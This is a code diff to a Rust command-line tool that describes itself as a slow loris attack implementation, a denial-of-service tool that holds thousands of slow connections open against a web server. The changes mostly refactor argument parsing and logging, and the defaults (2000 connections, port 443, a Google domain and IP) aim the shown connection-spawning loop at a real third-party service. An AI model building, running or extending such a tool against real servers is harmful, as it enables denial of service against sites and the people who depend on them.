@@ -1,14 +1,11 @@
 use chrono::Local;
-use clap::{Command, Parser};
 use console::Term;
 //use dns_lookup::lookup_addr;
 //use dns_lookup::lookup_host;
-use dns_lookup::getnameinfo;
 use indicatif::{MultiProgress, ProgressBar, ProgressDrawTarget, ProgressStyle};
 use rand::distributions::Alphanumeric;
 use rand::{thread_rng, Rng};
 use std::io::Write;
-//use std::net::SocketAddr;
 use std::net::{IpAddr, Ipv4Addr, /*Ipv6Addr,*/ TcpStream};
 use std::sync::{Arc, Mutex};
 use std::thread::{sleep, spawn};
@@ -22,12 +19,12 @@ use tracing::{event, Level};
 // alias ips="ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/, \"\"); print }'"
 //
 
-#[derive(Debug, Parser)]
+#[derive(Debug)]
 struct Args {
     host: String,
     ip: IpAddr,
-    port: String,
-    max_connections: String,
+    port: u16,
+    max_connections: u64,
     timeout_min: u64,
     timeout_max: u64,
     body_length_min: usize,
@@ -38,8 +35,8 @@ impl Args {
         Self {
             host: String::from(""),
             ip: std::net::IpAddr::V4(Ipv4Addr::new(142, 251, 175, 10)),
-            port: "0".to_string(),
-            max_connections: 0.to_string(),
+            port: 0,
+            max_connections: 0,
             timeout_min: 0,
             timeout_max: u64::MAX,
             body_length_min: 0_usize,
@@ -84,7 +81,17 @@ fn _get_my_ip() -> Result<String, Box<dyn std::error::Error>> {
         Ok(ip_address.trim().to_string())
     } else {
         // Convert stderr to a String
-        Ok(format!("Raw stderr: {:?}", output.stderr))
+        match str::from_utf8(&output.stderr) {
+            Ok(error_string) => {
+                eprintln!("Error executing dig command: {}", error_string.trim());
+                Ok(format!("Raw stderr: {:?}", error_string.trim()))
+            }
+            Err(e) => {
+                eprintln!("Error converting stderr to String: {:?}", e);
+                eprintln!("Raw stderr: {:?}", output.stderr);
+                Ok(format!("Raw stderr: {:?}", output.stderr))
+            }
+        }
     }
 }
 
@@ -110,9 +117,9 @@ fn main() {
     // set the important application variables and states
     let args = Arc::new(parse_args());
     //let host = args.host.clone();
-    tracing::trace!("123:args:{:?}", args);
-    tracing::trace!("124:host:{:?}", args.host);
-    tracing::trace!("125:ip:{:?}", args.ip);
+    tracing::trace!("args:{:?}", args);
+    tracing::trace!("host:{:?}", args.host);
+    tracing::trace!("ip:{:?}", args.ip);
     let attrs = Arc::new(Mutex::new(Attrs::new()));
 
     // create a progress bar
@@ -120,13 +127,11 @@ fn main() {
     // amount of connections
     let progress_bars = MultiProgress::new();
     progress_bars.set_draw_target(ProgressDrawTarget::stdout_with_hz(10));
-    let connection_bar = progress_bars.add(
-        ProgressBar::new(args.max_connections.parse::<u64>().unwrap()).with_style(
-            ProgressStyle::default_bar().template(
-                "Average response time: {msg} ms\nSending connections: {pos}/{len}\n{wide_bar}",
-            ),
+    let connection_bar = progress_bars.add(ProgressBar::new(args.max_connections).with_style(
+        ProgressStyle::default_bar().template(
+            "Average response time: {msg} ms\nSending connections: {pos}/{len}\n{wide_bar}",
         ),
-    );
+    ));
     let success_bar = progress_bars.add(ProgressBar::new(100).with_style(
         ProgressStyle::default_bar().template("successful requests: {pos}%\n{wide_bar}"),
     ));
@@ -142,9 +147,8 @@ fn main() {
 
     // change the Ctrl+C behaviour to just exit the process
     ctrlc::set_handler(|| std::process::exit(0)).expect("Could not change ctrl-c behaviour");
-    println!("153:args.host:{}", args.host);
-    //println!("154:args.domain:{}", args.domain);
-    println!("155:{:?}:{}", args.ip, args.port);
+    println!("{}", args.host);
+    println!("{:?}:{:?}", args.ip, args.port);
     tracing::debug!("body_length_min:{:?}", args.body_length_min);
     tracing::debug!("body_length_max:{:?}", args.body_length_max);
 
@@ -173,10 +177,10 @@ fn main() {
             success_bar.set_position(successful_connects);
 
             // spawn a new thread if not enough connections exists
-            if current_threads < args.max_connections.parse::<u64>().unwrap() {
-                let args = Arc::clone(&args.clone());
+            if current_threads < args.max_connections {
+                let args = Arc::clone(&args);
                 let attrs = Arc::clone(&attrs);
-                let port = args.port.clone();
+                let port = args.port;
 
                 {
                     let mut attrs = attrs.lock().unwrap();
@@ -187,10 +191,10 @@ fn main() {
                 }
 
                 spawn(move || {
-                    println!("{:?}", args);
-                    println!("{:?}", attrs);
-                    println!("{:?}", args.port);
-                    new_socket(args, attrs, port.parse::<u16>().unwrap());
+                    tracing::debug!("\n{:?}", args);
+                    tracing::debug!("\n{:?}", attrs);
+                    tracing::debug!("\n{:?}", args.port);
+                    new_socket(args, attrs, port);
                 });
             }
         }
@@ -201,7 +205,7 @@ fn main() {
 
 /// parses the arguments given to the application
 fn parse_args() -> Args {
-    use clap::{Arg, Parser};
+    use clap::{App, Arg};
     use dns_lookup::lookup_host;
 
     fn validate_range(string: &str) -> Result<(), String> {
@@ -216,101 +220,112 @@ fn parse_args() -> Args {
     }
 
     let _ = Args::new(); //just a test
+    let matches = App::new("Slow Loris")
+        .about("A slow loris attack implementation in Rust")
+        .author(clap::crate_authors!())
+        .version(clap::crate_version!())
+        .arg(
+            Arg::with_name("address")
+                .help("The ip address of the server.")
+                .takes_value(true)
+                .default_value("127.0.0.1")
+                .required(true),
+        )
+        .arg(
+            Arg::with_name("domain")
+                .help("The domain of the server")
+                .takes_value(true)
+                .default_value("www.google.com")
+                .required(false),
+        )
+        .arg(
+            Arg::with_name("connections")
+                .help("The amount of connections established")
+                .short("c")
+                .long("connections")
+                .takes_value(true)
+                .default_value("2000")
+                .validator(|connections| {
+                    if connections.parse::<u64>().is_ok() {
+                        Ok(())
+                    } else {
+                        Err("must be an unsigned integer".to_string())
+                    }
+                }),
+        )
+        .arg(
+            Arg::with_name("timeout")
+                .help(
+                    "specifies the timeout between each send byte in seconds\n\
+            takes values in the form of: <time> | <start>..<end> | <start>..=<end>\n",
+                )
+                .short("t")
+                .long("timeout")
+                .takes_value(true)
+                .default_value("5..10")
+                .validator(|timeout| validate_range(&timeout)),
+        )
+        .arg(
+            Arg::with_name("body_length")
+                .help(
+                    "specifies the body length of the request each connection sends\n\
+            takes values in the form of: <length> | <start>..<end> | <start>..=<end>\n",
+                )
+                .short("b")
+                .long("body_length")
+                .takes_value(true)
+                .default_value("11000")
+                .validator(|length| validate_range(&length)),
+        )
+        .arg(
+            Arg::with_name("port")
+                .help("specifies the port to connect to")
+                .short("p")
+                .long("port")
+                .takes_value(true)
+                .default_value("443")
+                .validator(|port| {
+                    if port.parse::<u16>().is_ok() {
+                        Ok(())
+                    } else {
+                        Err("must be an unsigned integer".to_string())
+                    }
+                }),
+        )
+        .get_matches();
 
-    let authors = env!("CARGO_PKG_AUTHORS");
-    let version = env!("CARGO_PKG_VERSION");
-
-    let matches = Command::new("Slow Loris")
-                             .about("A slow loris attack implementation in Rust")
-                             .author(authors)
-                             .version(version)
-                             .arg(
-                                 Arg::new("address")
-                                     .help("The ip address of the server.")
-                                     //.takes_value(true)
-                                     .default_value("127.0.0.1")
-                                     .required(true),
-                             )
-                             .arg(
-                                 Arg::new("domain")
-                                     .help("The domain of the server")
-                                     //.takes_value(true)
-                                     .default_value("www.google.com")
-                                     .required(false),
-                             )
-                             .arg(
-                                 Arg::new("connections")
-                                     .help("The amount of connections established")
-                                     .short('c')
-                                     .long("connections")
-                                     .default_value("2000"),
-                             )
-                             .arg(
-                                 Arg::new("timeout")
-                                     .help(
-                                         "specifies the timeout between each send byte in seconds\n\
-                                 takes values in the form of: <time> | <start>..<end> | <start>..=<end>\n",
-                                     )
-                                     .short('t')
-                                     .long("timeout")
-                                     //.takes_value(true)
-                                     .default_value("5..10"),
-                             )
-                             .arg(
-                                 Arg::new("body_length")
-                                     .help(
-                                         "specifies the body length of the request each connection sends\n\
-                                 takes values in the form of: <length> | <start>..<end> | <start>..=<end>\n",
-                                     )
-                                     .short('b')
-                                     .long("body_length")
-                                     .default_value("11000"),
-                             )
-                             .arg(
-                                 Arg::new("port")
-                                     .help("specifies the port to connect to")
-                                     .short('p')
-                                     .long("port")
-                                     .default_value("443")
-                             )
-                             .get_matches();
-
-    //let port = *matches.get_one::<u16>("port").unwrap();
-    //let port = *matches.get_one::<String>("port").unwrap();
-    let port = matches.get_one::<String>("port").unwrap().clone();
-    let max_connections = matches.get_one::<String>("connections").unwrap().clone();
-    //let max_connections = *matches.get_one::<String>("connections").unwrap();
-    let (timeout_min, timeout_max) = parse_range(&"5..10".to_string()).unwrap();
-    let body_length = parse_range(&"11000".to_string()).unwrap();
+    let port = matches.value_of("port").unwrap().parse().unwrap();
+    let max_connections = matches.value_of("connections").unwrap().parse().unwrap();
+    let (timeout_min, timeout_max) = parse_range(matches.value_of("timeout").unwrap()).unwrap();
+    let body_length = parse_range(matches.value_of("body_length").unwrap()).unwrap();
     let (body_length_min, body_length_max) = (body_length.0 as usize, body_length.1 as usize);
 
-    //use dns_lookup::getnameinfo;
+    use dns_lookup::getnameinfo;
     use std::net::{IpAddr, SocketAddr};
     let host;
-    let address = matches.get_one::<String>("address").unwrap().clone();
     //let ip;
     let mut ip: IpAddr = "127.0.0.1".parse().unwrap();
-    //let port = 443u16; //args.port;
-    //let address = "www.google.com"; //matches.value_of("address").unwrap();
-    println!("301:address:{}", address);
+    //let port = args.port;
+    let address = matches.value_of("address").unwrap();
+    println!("address:{}", address);
     match address.parse::<IpAddr>() {
         Ok(parsed) => {
             host = dns_lookup::lookup_addr(&parsed).expect("Could not find hostname for given ip");
             ip = parsed;
-            tracing::info!("306:{}:{}", host, ip);
+            tracing::info!("{}:{}", host, ip);
         }
         Err(_) => {
             host = address.to_string();
-            println!("310:host={}", host);
-            tracing::debug!("311:{}", host);
+            println!("host={}", host);
+            tracing::debug!("{}", host);
 
             //let hostname = "localhost";
             //let ips: Vec<std::net::IpAddr> = lookup_host(hostname).unwrap();
             //            let socket: SocketAddr = (host, 0).into();
 
             //let mut ip: IpAddr = "127.0.0.1".parse().unwrap();
-            let socket: SocketAddr = (ip, port.parse::<u16>().unwrap()).into();
-            tracing::info!("319:{}", socket);
+            let socket: SocketAddr = (ip, port).into();
+            tracing::info!("{}", socket);
 
             //host = getnameinfo(&socket, 0).unwrap();
 
@@ -319,8 +334,8 @@ fn parse_args() -> Args {
                 Err(e) => panic!("Failed to lookup socket {:?}", e),
             };
 
-            println!("328:name={}", name);
-            println!("329:service={}", service);
+            println!("name={}", name);
+            println!("service={}", service);
 
             let ips: Vec<std::net::IpAddr> =
                 lookup_host(&host).unwrap_or(vec!["192.168.1.1".parse().unwrap()]);
